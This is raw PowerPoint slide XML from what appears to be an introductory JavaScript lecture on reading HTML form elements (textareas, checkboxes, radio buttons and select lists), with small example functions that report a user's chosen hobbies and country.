              </a:rPr>
              <a:t>"New </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1400" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="A31515"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>Text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id_textarea</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 =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First</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="A31515"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1400" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="A31515"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>line</a:t>
            </a:r>
            <a:endParaRPr lang="fi-FI" sz="1400" b="0" dirty="0">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="fi-FI" sz="1400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="A31515"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>        </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1400" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="A31515"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>second</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="A31515"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1400" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="A31515"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>line</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="A31515"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> ÄÖ`</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Otsikko 1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{DE22232E-8010-4587-B16A-F33D653E11E7}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" dirty="0">
                <a:hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t>Checkboxes</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" dirty="0"/>
              <a:t> and </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" dirty="0">
                <a:hlinkClick r:id="rId3"/>
              </a:rPr>
              <a:t>Radio Buttons</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="fi-FI" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="80899" name="Sisällön paikkamerkki 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{E47E50F7-87CC-4763-84EF-B306F51BD6D2}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="609600" y="1600200"/>
            <a:ext cx="10972800" cy="4983162"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" dirty="0"/>
              <a:t>If you have grouped checkbox or radio buttons under the same name:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1" eaLnBrk="1" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" dirty="0" err="1"/>
              <a:t>document.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" i="1" dirty="0" err="1"/>
              <a:t>myform</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" dirty="0" err="1"/>
              <a:t>.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" i="1" dirty="0" err="1"/>
              <a:t>mygroup</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" dirty="0"/>
              <a:t>[</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" i="1" dirty="0"/>
              <a:t>index</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" dirty="0"/>
              <a:t>]</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1" eaLnBrk="1" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" dirty="0" err="1"/>
              <a:t>document.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" i="1" dirty="0" err="1"/>
              <a:t>myform</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" dirty="0" err="1"/>
              <a:t>.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" i="1" dirty="0" err="1"/>
              <a:t>mygroup</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" dirty="0" err="1"/>
              <a:t>.length</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="fi-FI" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1" eaLnBrk="1" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" dirty="0" err="1"/>
              <a:t>document.getElementsByName</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" dirty="0"/>
              <a:t>("</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" i="1" dirty="0" err="1"/>
              <a:t>mygroup</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" dirty="0"/>
              <a:t>") </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" dirty="0">
                <a:sym typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              </a:rPr>
              <a:t> collection</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="fi-FI" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" dirty="0"/>
              <a:t>If you have use unique names:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1" eaLnBrk="1" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" dirty="0" err="1"/>
              <a:t>document.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" i="1" dirty="0" err="1"/>
              <a:t>myform</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" dirty="0" err="1"/>
              <a:t>.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" i="1" dirty="0" err="1"/>
              <a:t>uniquename</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="fi-FI" i="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1" eaLnBrk="1" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" dirty="0" err="1"/>
              <a:t>document.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" i="1" dirty="0" err="1"/>
              <a:t>myform.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" dirty="0" err="1"/>
              <a:t>elements</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" dirty="0"/>
              <a:t>[index]</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" dirty="0"/>
              <a:t>.checked attribute is true if checked, false if not</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1" eaLnBrk="1" hangingPunct="1"/>
            <a:endParaRPr lang="en-US" altLang="fi-FI" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1" eaLnBrk="1" hangingPunct="1"/>
            <a:endParaRPr lang="en-US" altLang="fi-FI" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1" eaLnBrk="1" hangingPunct="1"/>
            <a:endParaRPr lang="en-US" altLang="fi-FI"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Otsikko 1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{A1C41928-5507-47F1-9407-CCBB0942FF8B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" dirty="0"/>
              <a:t>Processing Checkboxes</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="81923" name="Sisällön paikkamerkki 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{E3AD30F4-6100-4ABE-A79B-CB43A46B1919}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="609600" y="1600200"/>
            <a:ext cx="10972800" cy="5141168"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>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text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javascript</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function</a:t>
            </a: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hobbycheck</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var</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hobbies</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1200" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> = [</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1200" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="A31515"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>"TV"</a:t>
            </a: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"music"</a:t>
            </a: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games</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var</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myHobbies</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1200" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> = [];</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="fi-FI" sz="1200" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>            </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1200" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="AF00DB"/>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choice</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of</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getElementsByName</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"hobby"</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choice</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checked</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1200" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> &amp;&amp; </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1200" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="001080"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>hobbies</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findIndex</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1200" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>((</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x</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choice</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myHobbies</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push</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choice</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myHobbies</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length</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Your</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hobbies</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are</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1200" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="A31515"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1200" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>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myHobbies</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join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 "</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 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1200" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="AF00DB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>else</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You</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have</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1200" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="A31515"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> no </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1200" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="A31515"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>hobbies</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action</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myform</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"tv"</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1200" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="800000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>&gt;&lt;input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checkbox</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"hobby"</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"tv"</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"TV"</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TV</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"music"</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1200" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="800000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>&gt;&lt;input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checkbox</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"hobby"</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"music"</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"music"</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music</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games</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checkbox</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"hobby"</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games</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games</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games</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label</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button</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check</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onclick</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hobbycheck</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Otsikko 1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{8B17166F-C603-4AD1-A9AD-7AB9BB4CE1B0}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI">
                <a:hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t>&lt;select&gt; &lt;option&gt;</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="fi-FI"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Sisällön paikkamerkki 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{7981F221-8E1D-4285-8FD7-1B034022270C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr rtlCol="0">
            <a:normAutofit fontScale="70000" lnSpcReduction="20000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Getting select object:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>document.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" i="1" dirty="0" err="1"/>
              <a:t>myform</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" i="1" dirty="0" err="1"/>
              <a:t>myselect</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" i="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>document.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" i="1" dirty="0" err="1"/>
              <a:t>myform.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>elements</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>[i]</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>document.getElementById("</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" i="1" dirty="0" err="1"/>
              <a:t>selectid</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>")</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>each select object has an </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>options</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> property, which is an array and each of them has</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1" eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>value </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>property for the value</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1" eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>text</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> property for the text value</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1" eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>selected </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>property, which is true if that options was selected (for multiple choice selects)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>each select object has an </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" err="1"/>
              <a:t>selectedIndex</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> property telling which options index was selected</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>document.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" i="1" dirty="0" err="1"/>
              <a:t>myform</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" i="1" dirty="0" err="1"/>
              <a:t>myselect</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>.options</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>[</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>selectedIndex</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>]</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>document.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" i="1" dirty="0" err="1"/>
              <a:t>myform</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" i="1" dirty="0" err="1"/>
              <a:t>myselect</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>.options</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>[</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" i="1" dirty="0"/>
              <a:t>index</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>]</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" i="1" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>selected</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>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Otsikko 1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{2D88885F-BDAC-40D1-B331-F766F20F05C9}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI"/>
              <a:t>Select Option Example</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="83971" name="Sisällön paikkamerkki 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{C444F871-4AE9-4978-8F0F-3D43CB841CE1}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="609600" y="1600200"/>
            <a:ext cx="10972800" cy="4983162"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>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function</a:t>
            </a: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showSelected</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form</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You</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selected</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form</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country</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options</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form</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country</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selectedIndex</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value</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selectObj</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getElementById</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id_country</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You</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selected</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selectObj</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selectObj</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selectedIndex</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text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action</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method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get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myform</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select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"country"</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id_country</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dk</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Denmark</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fi</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selected</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Finland</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"lv"</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Latvia</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"no"</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Norway</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sv</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Sweden</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ru</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Russia</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select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&lt;input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type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button</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"Show"</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onclick</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showSelected</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1200" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>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document</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1200" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>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myform</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Otsikko 1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{DCEC5A8C-AECC-4717-8E00-E92D1ACD2B2B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" dirty="0" err="1"/>
              <a:t>Multi</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" dirty="0"/>
              <a:t> Select </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" altLang="fi-FI" dirty="0" err="1"/>
              <a:t>Example</a:t>
            </a:r>
            <a:endParaRPr lang="fi-FI" altLang="fi-FI" dirty="0"/>
          </a:p>
        </p:txBody>
